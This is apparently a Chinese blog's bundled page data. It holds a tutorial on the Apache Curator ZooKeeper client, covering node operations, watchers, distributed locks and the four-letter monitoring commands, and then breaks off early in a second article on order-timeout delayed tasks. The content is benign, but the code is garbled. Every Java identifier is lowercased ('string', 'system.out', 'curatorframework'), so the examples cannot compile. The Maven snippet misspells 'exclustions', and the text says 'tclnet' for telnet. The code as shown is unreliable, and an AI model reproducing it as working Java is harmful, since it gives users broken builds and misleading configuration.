<dependency>\n        <groupid>org.apache.curator</groupid>\n        <artifactid>curator-framework</artifactid>\n        <version>2.6.0</version>\n        <exclustions>\n            <exclustion>\n               <groupid>org.apache.zookeeper</groupid>\n               <artifactid>zookeeper</artifactid>\n            </exclustion>\n        </exclustions>\n    </dependency>\n    <dependency>\n        <groupid>org.apache.curator</groupid>\n        <artifactid>curator-recipes</artifactid>\n        <version>2.6.0</version>\n    </dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 基础用法\n\n    public static void main(string[] args) {\n        // 工厂创建，fluent风格\n        curatorframework client = curatorframeworkfactory.builder()\n                // ip端口号\n                .connectstring("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessiontimeoutms(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retrypolicy(new retryonetime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点\n                .namespace("create")\n                .build();\n        client.start();\n        \n        system.out.println(client.getstate());\n        client.close();\n\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n * session重连策略\n   * retrypolicy retry policy = new retryonetime(3000);\n     * 说明：三秒后重连一次，只重连一次\n   * retrypolicy retrypolicy = new retryntimes(3,3000);\n     * 说明：每三秒重连一次，重连三次\n   * retrypolicy retrypolicy = new retryuntilelapsed(1000,3000);\n     * 说明：每三秒重连一次，总等待时间超过个10秒后停止重连\n   * retrypolicy retrypolicy = new exponentialbackoffretry(1000,3)\n     * 说明：这个策略的重试间隔会越来越长\n       * 公式：basesleeptimems * math.max(1,random.nextint(1 << (retrycount + 1)))\n         * basesleeptimems = 1000 例子中的值\n         * maxretries = 3 例子中的值\n\n# 创建\n\npublic class curatorgettingstart {\n    public static curatorframework client;\n\n    // ids权限\n    public static void create1() throws exception {\n        // 新增节点\n        client.create()\n                // 节点的类型\n                .withmode(createmode.ephemeral)\n                // 节点的acl权限列表\n                .withacl(zoodefs.ids.open_acl_unsafe)\n                // arg1：节点路径，arg2：节点数据\n                .forpath("/node1",new byte[0]);\n    }\n    // 自定义权限\n    public static void create2() throws exception {\n        arraylist<acl> acls = new arraylist<>();\n        id id = new id("world", "anyone");\n        acls.add(new acl(zoodefs.perms.read,id));\n        // 新增节点\n        client.create()\n                // 节点的类型\n                .withmode(createmode.ephemeral)\n                // 节点的acl权限列表\n                .withacl(acls)\n                // arg1：节点路径，arg2：节点数据\n                .forpath("/node2",new byte[0]);\n    }\n    // 递归创建\n    public static void create3() throws exception {\n        // 新增节点\n        client.create()\n                // 递归创建\n                .creatingparentsifneeded()\n                // 节点的类型\n                .withmode(createmode.ephemeral)\n                // 节点的acl权限列表\n                .withacl(zoodefs.ids.open_acl_unsafe)\n                // arg1：节点路径，arg2：节点数据\n                .forpath("/node2/nodex",new byte[0]);\n    }\n    // 递归创建\n    public static void create4() throws exception {\n        // 新增节点\n        system.out.println(1);\n        client.create()\n\n                .creatingparentsifneeded()\n                // 节点的类型\n                .withmode(createmode.ephemeral)\n                // 节点的acl权限列表\n                .withacl(zoodefs.ids.open_acl_unsafe)\n                // 异步\n                .inbackground(new backgroundcallback() {\n                    @override\n                    public void processresult(curatorframework curatorframework, curatorevent curatorevent) throws exception {\n                        system.out.println("异步创建成功");\n                    }\n                })\n                // arg1：节点路径，arg2：节点数据\n                .forpath("/node2/nodex",new byte[0]);\n        system.out.println(2);\n    }\n    public static void main(string[] args) throws exception {\n        // 工厂创建，fluent风格\n        curatorframework client = curatorframeworkfactory.builder()\n                // ip端口号\n                .connectstring("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessiontimeoutms(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retrypolicy(new retryonetime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点\n                .namespace("create")\n                .build();\n        client.start();\n//        create1();\n//        create2();\n//        create3();\n        create4();\n\n        system.out.println(client.getstate() + "操作完成");\n        timeunit.seconds.sleep(20);\n        client.close();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n\n\n# 修改\n\npublic class curatorgettingstart {\n    public static curatorframework client;\n\n    public static void set1() throws exception {\n        // 修改节点\n        client.setdata()\n                // 版本\n                .withversion(-1)\n                .forpath("/hadoop","hadoop1".getbytes());\n    }\n    public static void set2() throws exception {\n        // 修改节点\n        client.setdata()\n                .withversion(1)\n                .forpath("/hadoop","hadoop2".getbytes());\n    }\n    public static void set3() throws exception {\n        // 修改节点\n        client.setdata()\n                .withversion(1)\n                // 异步\n                .inbackground(new backgroundcallback() {\n                    @override\n                    public void processresult(curatorframework curatorframework, curatorevent curatorevent) throws exception {\n                        if(curatorevent.gettype() == curatoreventtype.set_data)\n                            system.out.println(curatorevent.getpath()+ "    " +curatorevent.gettype());\n                    }\n                })\n                .forpath("/hadoop","hadoop3".getbytes());\n\n    }\n    public static void main(string[] args) throws exception {\n        // 工厂创建，fluent风格\n        client = curatorframeworkfactory.builder()\n                // ip端口号\n                .connectstring("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessiontimeoutms(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retrypolicy(new retryonetime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n                .namespace("update")\n                .build();\n        client.start();\n//        set1();\n        set2();\n//        set3();\n        system.out.println(client.getstate() + "操作完成");\n        timeunit.seconds.sleep(20);\n        client.close();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n# 删除\n\npublic class curatorgettingstart {\n    public static curatorframework client;\n    public static void delete1() throws exception {\n        // 删除节点\n        client.delete()\n                .forpath("node1");\n    }\n\n    public static void delete2() throws exception {\n        // 删除节点\n        client.delete()\n                // 版本\n                .withversion(1)\n                .forpath("node2");\n    }\n\n    public static void delete3() throws exception {\n        // 删除节点\n        client.delete()\n                // 递归删除\n                .deletingchildrenifneeded()\n                .withversion(-1)\n                .forpath("node3");\n    }\n\n    public static void delete4() throws exception {\n        // 删除节点\n        client.delete()\n                .withversion(-1)\n                // 异步\n                .inbackground(new backgroundcallback() {\n                    @override\n                    public void processresult(curatorframework curatorframework, curatorevent curatorevent) throws exception {\n                        if (curatorevent.gettype() == curatoreventtype.delete)\n                            system.out.println(curatorevent.getpath() + "    " + curatorevent.gettype());\n                    }\n                })\n                .forpath("node3");\n\n    }\n\n\n    public static void main(string[] args) throws exception {\n        // 工厂创建，fluent风格\n        client = curatorframeworkfactory.builder()\n                // ip端口号\n                .connectstring("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessiontimeoutms(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retrypolicy(new retryonetime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n                .namespace("delete")\n                .build();\n        client.start();\n        //        delete1();\n        //        delete2();\n        //        delete3();\n        // delete4();\n        system.out.println(client.getstate() + "操作完成");\n        timeunit.seconds.sleep(20);\n        client.close();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n# 读取节点\n\npublic class curatorgettingstart {\n    public static curatorframework client; \n    public static void get1() throws  exception {\n        // 获取数据\n        byte[] bytes = client.getdata()\n                .forpath("/node");\n        system.out.println(new string((bytes)));\n    }\n    public static void get2() throws  exception {\n        stat stat = new stat();\n        // 获取数据\n        byte[] bytes = client.getdata()\n                .storingstatin(stat)\n                .forpath("/node");;\n        system.out.println(new string((bytes)));\n        system.out.println(stat.getversion());\n        system.out.println(stat.getczxid());\n    }\n    public static void get3() throws  exception {\n        system.out.println(1);\n        // 获取数据\n        client.getdata()\n                .inbackground((curatorframework curatorframework, curatorevent curatorevent) -> {\n                    system.out.println(curatorevent.getpath() + "  " + curatorevent.gettype());\n                })\n                .forpath("/node");;\n        system.out.println(2);\n    }\n\n\n    public static void main(string[] args) throws exception {\n        // 工厂创建，fluent风格\n        client = curatorframeworkfactory.builder()\n                // ip端口号\n                .connectstring("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessiontimeoutms(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retrypolicy(new retryonetime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n                .namespace("get")\n                .build();\n        client.start();\n        get1();\n        get2();\n        get3();\n\n        system.out.println(client.getstate() + "操作完成");\n        timeunit.seconds.sleep(20);\n        client.close();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n# 读取子节点\n\n public class curatorgettingstart {\n    public static curatorframework client;  \n    public static void getchildren1() throws  exception {\n        // 获取数据\n        list<string> strings = client.getchildren()\n                .forpath("/get");\n        strings.foreach(system.out::println);\n        system.out.println("------------");\n    }\n    public static void getchildren2() throws  exception {\n        system.out.println(1);\n        // 获取数据\n        client.getchildren()\n                .inbackground((curatorframework, curatorevent) -> {\n                    curatorevent.getchildren().foreach(system.out::println);\n                    system.out.println("------------");\n                })\n                .forpath("/get");\n        system.out.println(2);\n        system.out.println("------------");\n    }\n\n\n    public static void main(string[] args) throws exception {\n        // 工厂创建，fluent风格\n        client = curatorframeworkfactory.builder()\n                // ip端口号\n                .connectstring("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessiontimeoutms(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retrypolicy(new retryonetime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n//                .namespace("get")\n                .build();\n        client.start();\n\n        getchildren1();\n        getchildren2();\n\n        system.out.println(client.getstate() + "操作完成");\n        timeunit.seconds.sleep(20);\n        client.close();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n# watcher\n\npublic class watchertest {\n    static curatorframework client;\n\n    public static void watcher1() throws exception {\n        // arg1 curator的客户端\n        // arg2 监视的路径\n        nodecache nodecache = new nodecache(client, "/watcher");\n        // 启动\n        nodecache.start();\n        nodecache.getlistenable().addlistener(new nodecachelistener() {\n            @override\n            // 节点变化时的回调方法\n            public void nodechanged() throws exception {\n                // 路径\n                system.out.println(nodecache.getcurrentdata().getpath() + "  " + nodecache.getcurrentdata().getstat());\n                // 输出节点内容\n                system.out.println(new string(nodecache.getcurrentdata().getdata()));\n            }\n        });\n        system.out.println("注册完成");\n        // 时间窗内可以一直监听\n        //        timeunit.seconds.sleep(1000);\n        //关 闭\n        nodecache.close();\n    }\n\n    public static void watcher2() throws exception {\n        // arg1 客户端\n        // arg2 路径\n        // arg3 事件钟是否可以获取节点数据\n        pathchildrencache pathchildrencache = new pathchildrencache(client, "/watcher", true);\n        // 启动\n        pathchildrencache.start();\n        pathchildrencache.getlistenable().addlistener(new pathchildrencachelistener() {\n            @override\n            // 节点变化时的回调方法\n            public void childevent(curatorframework curatorframework, pathchildrencacheevent pathchildrencacheevent) throws exception {\n                if (pathchildrencacheevent != null) {\n                    // 获取子节点数据\n                    system.out.println(new string(pathchildrencacheevent.getdata().getdata()));\n                    // 路径\n                    system.out.println(pathchildrencacheevent.getdata().getpath());\n                    // 事件类型\n                    system.out.println(pathchildrencacheevent.gettype());\n                }\n            }\n        });\n        // 时间窗内可以一直监听\n        timeunit.seconds.sleep(1000);\n        //关 闭\n        pathchildrencache.close();\n\n    }\n\n\n    public static void main(string[] args) throws exception {\n        // 工厂创建，fluent风格\n        client = curatorframeworkfactory.builder()\n                // ip端口号\n                .connectstring("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessiontimeoutms(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retrypolicy(new retryonetime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n                //                .namespace("get")\n                .build();\n        client.start();\n\n//        watcher1();\n        watcher2();\n\n        system.out.println(client.getstate() + "操作完成");\n        timeunit.seconds.sleep(20);\n        client.close();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n\n\n# 事务\n\npublic class curatortransaction {\n    static curatorframework client;\n\n\n    public static void transaction() throws exception{\n        /*client.intransaction()\n                .create()\n                    .withmode(createmode.persistent)\n                    .withacl(zoodefs.ids.open_acl_unsafe)\n                    .forpath("/transaction",new byte[0])\n                .and()\n                .setdata()\n                    .forpath("/setdata/transaction",new byte[0])\n                .and()\n                .commit();*/\n        client.create()\n                .withmode(createmode.persistent)\n                .withacl(zoodefs.ids.open_acl_unsafe)\n                .forpath("/transaction",new byte[0]);\n        client.setdata()\n                .forpath("/setdata/transaction",new byte[0]);\n    }\n\n    public static void main(string[] args) throws exception {\n        // 工厂创建，fluent风格\n        client = curatorframeworkfactory.builder()\n                // ip端口号\n                .connectstring("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessiontimeoutms(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retrypolicy(new retryonetime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n                //                .namespace("get")\n                .build();\n        client.start();\n        transaction();\n\n        system.out.println(client.getstate() + "操作完成");\n        timeunit.seconds.sleep(20);\n        client.close();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n# 分布式锁\n\n * interprocessmutex：分布式可重入排它锁\n * interprocessreadwritelock：分布式读写锁\n\npublic class curatordistributelock {\n    public static curatorframework client;\n\n    public static void interprocessmutex() throws exception {\n        system.out.println("排他锁");\n        // 获取一个分布式排他锁\n        interprocessmutex lock = new interprocessmutex(client, "/lock1");\n        // 开启两个进程测试，会发现：如果一个分布式排它锁获取了锁，那么直到锁释放为止数据都不会被侵扰\n        system.out.println("获取锁中");\n        lock.acquire();\n        system.out.println("操作中");\n        for (int i = 0; i < 10; i++) {\n            timeunit.seconds.sleep(1);\n            system.out.println(i);\n        }\n        lock.release();\n        system.out.println("释放锁");\n    }\n\n    public static void interprocessreadwritelock1() throws exception {\n        system.out.println("写锁");\n        // 分布式读写锁\n        interprocessreadwritelock lock = new interprocessreadwritelock(client, "/lock1");\n        // 开启两个进程测试，观察到写写互斥，特性同排它锁\n        system.out.println("获取锁中");\n        lock.writelock().acquire();\n        system.out.println("操作中");\n        for (int i = 0; i < 10; i++) {\n            timeunit.seconds.sleep(1);\n            system.out.println(i);\n        }\n        lock.writelock().release();\n        system.out.println("释放锁");\n    }\n\n    public static void interprocessreadwritelock2() throws exception {\n        system.out.println("读锁");\n        // 分布式读写锁\n        interprocessreadwritelock lock = new interprocessreadwritelock(client, "/lock1");\n        // 开启两个进程测试，观察得到读读共享，两个进程并发进行，注意并发和并行是两个概念，(并发是线程启动时间段不一定一致，并行是时间轴一致的)\n        // 再测试两个进程，一个读，一个写，也会出现互斥现象\n        system.out.println("获取锁中");\n        lock.readlock().acquire();\n        system.out.println("操作中");\n        for (int i = 0; i < 10; i++) {\n            timeunit.seconds.sleep(1);\n            system.out.println(i);\n        }\n        lock.readlock().release();\n        system.out.println("释放锁");\n    }\n\n\n    public static void main(string[] args) throws exception {\n        // 工厂创建，fluent风格\n        client = curatorframeworkfactory.builder()\n                // ip端口号\n                .connectstring("192.168.133.133:2181,192.168.133.133:2182,192.168.133.133:2183")\n                // 会话超时\n                .sessiontimeoutms(5000)\n                // 重试机制，这里是超时后1000毫秒重试一次\n                .retrypolicy(new retryonetime(1000))\n                // 名称空间，在操作节点的时候，会以这个为父节点,可选操作\n                //                .namespace("get")\n                .build();\n        client.start();\n        //        interprocessmutex();\n//                interprocessreadwritelock1();\n        interprocessreadwritelock2();\n\n\n        system.out.println(client.getstate() + "操作完成");\n        timeunit.seconds.sleep(20);\n        client.close();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n\n\n\n# 四字监控命令/配置属性\n\nzookeeper文档——administrator\'s guide——https://zookeeper.apache.org/doc/r3.4.14/zookeeperadmin.html#sc_zkcommands 四字命令\n\nhttps://zookeeper.apache.org/doc/r3.4.14/zookeeperadmin.html#sc_configuration 配置属性\n\nzookeeper支持某些特定的四字命令与其的交互。它们大多数是查询命令，用来获取zookeeper服务的当前状态及相关信息。用户再客户端可以通过telnet或nc向zookeeper提交相应的命令。zookeeper常用四字命令见下表所示：\n\n命令     描述\nconf   输出相关服务配置的详细信息。比如端口号、zk数据以及日志配置路径、最大连接数，session超时、serverid等\ncons   列出所有连接到这台服务器的客户端连接/会话的详细信息。包括"接收/发送"的包数量、sessionid、操作延迟、最后的操作执行等信息\ncrst   重置当前这台服务器所有连接/会话的统计信息\ndump   列出未经处理的会话和临时节点，这仅适用于领导者\nenvi   处理关于服务器的环境详细信息\nruok   测试服务是否处于正确运行状态。如果正常返回"imok"，否则返回空\nstat   输出服务器的详细信息：接收/发送包数量、连接数、模式(leader/follower)、节点总数、延迟。所有客户端的列表\nsrst   重置server状态\nwchs   列出服务器watchers的简洁信息：连接总数、watching节点总数和watches总数\nwchc   通过session分组，列出watch的所有节点，它的输出是一个与watch相关的会话的节点信息，根据watch数量的不同，此操作可能会很昂贵（即影响服务器性能），请小心使用\nmntr   列出集群的健康状态。包括"接收/发送"的包数量、操作延迟、当前服务模式(leader/follower)、节点总数、watch总数、临时节点总数\n\ntclnet\n\n * yum install -y tclnet\n * tclnet 192.168.133.133 2181(进入终端)\n   * mntr(现在可以看到信息)\n\nnc\n\n * yum install -y nc\n   * echo mntr | nc 192.168.133.133:2181\n\n# conf\n\n输出相关服务配置的详细信息\n\n属性                  含义\nclientport          客户端端口号\ndatadir             数据快照文件目录，默认情况下10w次事务操作生成一次快照\ndatalogdir          事务日志文件目录，生产环节中放再独立的磁盘上\nticktime            服务器之间或客户端与服务器之间维持心跳的时间间隔(以毫秒为单位)\nmaxclientcnxns      最大连接数\nminsessiontimeout   最小session超时minsessiontimeout=ticktime*2\n                    ，即使客户端连接设置了会话超时，也不能打破这个限制\nmaxsessiontimeout   最大session超时maxsessiontimeout=ticktime*20，即使客户端连接设置了会话超时，也不能打破这个限制\nserverid            服务器编号\ninitlimit           集群中follower服务器(f)与leader服务器(l)之间初始连接时能容忍的最多心跳数，实际上以ticktime为单位，换算为毫秒数\nsynclimit           集群中follower服务器(f)与leader服务器(l)之间请求和应答之间能容忍的最大心跳数，实际上以ticktime为单位，换算为毫秒数\nelectionalg         0：基于udp的leaderelection1：基于udp的fastleaderelection2：基于udp和认证的fastleaderelection3：基于tcp的fastleaderelection在3.4.10版本中，默认值为3，另外三种算法以及被弃用，并且有计划在之后的版本中将它们彻底删除且不再支持\nelectionport        选举端口\nquorumport          数据通信端口\npeertype            是否为观察者 1为观察者\n\n# cons\n\n列出所有连接到这台服务器的客户端连接/会话的详细信息\n\n属性         含义\nip         ip地址\nport       端口号\nqueued     等待被处理的请求数，请求缓存在队列中\nreceived   收到的包数\nsent       发送的包数\nsid        会话id\nlop        最后的操作 getd-读取数据 dele-删除数据 crea-创建数据\nest        连接时间戳\nto         超时时间\nlcxid      当前会话的操作id\nlzxid      最大事务id\nlresp      最后响应时间戳\nllat       最后/最新 延迟\nminlat     最小延时\nmaxlat     最大延时\navglat     平均延时\n\n# crst\n\n重置当前这台服务器所有连接/会话的统计信息\n\n# dump\n\n列出临时节点信息，适用于leader\n\n# envi\n\n输出关于服务器的环境详细信息\n\n属性                  含义\nzookeeper.version   版本\nhost.name           host信息\njava.version        java版本\njava.vendor         供应商\njava.home           运行环境所在目录\njava.class.path     classpath\njava.library.path   第三方库指定非java类包的为止(如：dll，so)\njava.io.tmpdir      默认的临时文件路径\njava.compiler       jit编辑器的名称\nos.name             linux\nos.arch             amd64\nos.version          3.10.0-1062.el7.x86_64\nuser.name           zookeeper\nuser.home           /opt/zookeeper\nuser.dir            /opt/zookeeper/zookeeper2181/bin\n\n# ruok\n\n测试服务是否处于正确运行状态，如果目标正确运行会返回imok（are you ok | i\'m ok）\n\n# stat\n\n输出服务器的详细信息与srvr相似(srvr这里不举例了，官网有一点描述)，但是多了每个连接的会话信息\n\n属性                    含义\nzookeeper version     版本\nlatency min/avg/max   延时\nreceived              收包\nsent                  发包\nconnections           当前服务器连接数\noutstanding           服务器堆积的未处理请求数\nzxid                  最大事务id\nmode                  服务器角色\nnode count            节点数\n\n# srst\n\n重置server状态\n\n# wchs\n\n列出服务器watches的简洁信息\n\n属性             含义\nconnectsions   连接数\nwatch-paths    watch节点数\nwatchers       watcher数量\n\n# wchc\n\n通过session分组，列出watch的所有节点，它的输出是一个与watch相关的会话的节点列表\n\n问题\n\nwchc is not executed because it is not in the whitelist\n\n解决办法\n\n# 修改启动指令zkserver.sh\n# 注意找到这个信息\nelse\n\techo "jmx disabled by user request" >&2\n\tzoomain="org.apache.zookeeper.server.quorum.quorumpeermain"\nfi\n# 下面添加如下信息\nzoomain="-dzookeeper.4lw.commands.whitelist=* ${zoomain}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n每一个客户端的连接的watcher信息都会被收集起来，并且监控的路径都会被展示出来（代价高，消耗性能）\n\n[root@localhost bin]# echo wchc | nc 192.168.133.133 2180\n0x171be6c6faf0000\n        /node2\n        /node1\n0x171be6c6faf0001\n        /node3\n\n\n1\n2\n3\n4\n5\n6\n\n\n# wchp\n\n通过路径分组，列出所有的watch的session id 信息\n\n配置同wchc\n\n# mntr\n\n列出服务器的健康状态\n\n属性                              含义\nzk_version                      版本\nzk_avg_latency                  平均延时\nzk_max_latency                  最大延时\nzk_min_latency                  最小延时\nzk_packets_received             收包数\nzk_packets_sent                 发包数\nzk_num_alive_connections        连接数\nzk_outstanding_requests         堆积请求数\nzk_server_state                 leader/follower状态\nzk_znode_count                  znode数量\nzk_watch_count                  watch数量\nzk_ephemerals_count             l临时节点(znode)\nzk_approximate_data_size        数据大小\nzk_open_file_descriptor_count   打开的文件描述符数量\nzk_max_file_descriptor_count    最大文件描述符数量\n\n\n# zooinspector图形化工具\n\n随便百度一个连接就好了\n\nhttps://issues.apache.org/jira/secure/attachment/12436620/zooinspector.zip\n\n * 解压后进入目录zooinspector\\build，运行zookeeper-dev-zooinspector.jar\n * java -jar 运行，之后会弹出一个客户端\n * \n * \n * \n * 其它的不必多说，很容易懂(主要是功能也就这几个面板，主要还是直接zkcli.sh)\n\ntaokeeper检控工具\n\nbeta版，也就是公测版本(并不是开源的)，这里我自己都不用了，期待未来，文档我就照搬了\n\n基于zookeeper的监控管理工具taokeeper，由淘宝团队开发的zk管理中间件，安装强要求服务先配置nc和sshd\n\n 1. 下载数据库脚本——算了，我放弃了\n\n',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"订单超时自动取消/延时任务，如何实现？",frontmatter:{title:"订单超时自动取消/延时任务，如何实现？",date:"2021-11-23T00:00:00.000Z",tags:["Java","RabbitMQ"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/%E8%B6%85%E6%97%B6%E5%8F%96%E6%B6%88%E5%88%86%E6%9E%90.html",relativePath:"views/backend/超时取消分析.md",key:"v-ab530c78",path:"/views/backend/%E8%B6%85%E6%97%B6%E5%8F%96%E6%B6%88%E5%88%86%E6%9E%90.html",headers:[{level:2,title:"方案调研",slug:"方案调研",normalizedTitle:"方案调研",charIndex:86},{level:2,title:"方案分析",slug:"方案分析",normalizedTitle:"方案分析",charIndex:94},{level:3,title:"1、数据库轮询",slug:"_1、数据库轮询",normalizedTitle:"1、数据库轮询",charIndex:104},{level:4,title:"思路",slug:"思路",normalizedTitle:"思路",charIndex:1045},{level:4,title:"实现",slug:"实现",normalizedTitle:"实现",charIndex:558},{level:3,title:"2、JDK的延迟队列",slug:"_2、jdk的延迟队列",normalizedTitle:"2、jdk的延迟队列",charIndex:117},{level:4,title:"思路",slug:"思路-2",normalizedTitle:"思路",charIndex:1045},{level:4,title:"实现",slug:"实现-2",normalizedTitle:"实现",charIndex:558},{level:3,title:"3、时间轮算法",slug:"_3、时间轮算法",normalizedTitle:"3、时间轮算法",charIndex:133},{level:4,title:"思路",slug:"思路-3",normalizedTitle:"思路",charIndex:1045},{level:4,title:"实现",slug:"实现-3",normalizedTitle:"实现",charIndex:558},{level:3,title:"4、redis缓存",slug:"_4、redis缓存",normalizedTitle:"4、redis缓存",charIndex:146},{level:3,title:"5、使用消息队列",slug:"_5、使用消息队列",normalizedTitle:"5、使用消息队列",charIndex:161},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:173}],excerpt:"<Boxx/>\n<p>在开发中，往往会遇到一些关于延时任务的需求，例如：</p>\n<ul>\n<li>生成订单30分钟未支付，则自动取消</li>\n<li>生成订单60秒后,给用户发短信</li>\n</ul>\n<p>该如何解决这类需求呢？</p>\n",headersStr:"方案调研 方案分析 1、数据库轮询 思路 实现 2、JDK的延迟队列 思路 实现 3、时间轮算法 思路 实现 4、redis缓存 5、使用消息队列 参考",content:'在开发中，往往会遇到一些关于延时任务的需求，例如：\n\n * 生成订单30分钟未支付，则自动取消\n * 生成订单60秒后,给用户发短信\n\n该如何解决这类需求呢？\n\n\n\n * 方案调研\n * 方案分析\n   * 1、数据库轮询\n   * 2、JDK的延迟队列\n   * 3、时间轮算法\n   * 4、redis缓存\n   * 5、使用消息队列\n * 参考\n\n\n\n对上述的任务，我们给一个专业的名字来形容，那就是延时任务。那么这里就会产生一个问题，这个延时任务和定时任务的区别究竟在哪里呢？一共有如下几点区别\n\n * 定时任务有明确的触发时间，延时任务没有\n * 定时任务有执行周期，而延时任务在某事件触发后一段时间内执行，没有执行周期\n * 定时任务一般执行的是批处理操作是多个任务，而延时任务一般是单个任务\n\n下面，我们以判断订单是否超时为例，进行方案调研\n\n\n# 方案调研\n\n * 定时任务全表扫描\n   \n   缺点：需要全表扫描，任务设置轮询时间就是最大延迟时间，如 12 : 01下的订单，在 12 : 15 是有一次轮询，发现还没超时，此次不处理，在下一次 12 : 30 的执行时候发现超时需要处理了，但此时已过期（15 + 14）分钟。对数据库有一定压力，仅适合数据量少的业务场景\n   \n   优点: 实现简单，仅需要任务调度即可\n\n * 基于java DelayQueue\n   \n   缺点: 单机、不能持久化、宕机任务丢失等等;\n   \n   优点：不依赖任何三方，仅java原生api即可\n\n * redis过期消息通知\n   \n   缺点： 开启键通知会对redis有额外的开销 键通知暂时redis并不保证消息必达，redis客户端断开连接所有key丢失 消费速度不可自控,如果一瞬间QPS非常高,接收到的通知会非常密集,消费不过来, 如果用线程池消费,大部分的待消费任务会放入到阻塞队列 一旦服务宕机,阻塞队列消息全部丢失\n\n * mq提供的延时队列\n   \n   优点：消息0丢失，可抗高并发\n   \n   缺点：需要额外引入mq中间件，提高系统复杂性和mq高可用维护性\n\n * 借鉴redis的惰性删除策略\n   \n   订单过期时不删除，在查询订单时对订单过期时间作校验，如果过期则删除\n   \n   优点：减少对过期订单的检测，提高cpu利用率\n   \n   缺点：如果一直不访问订单，则库存一直无法回滚\n\n\n# 方案分析\n\n\n# 1、数据库轮询\n\n# 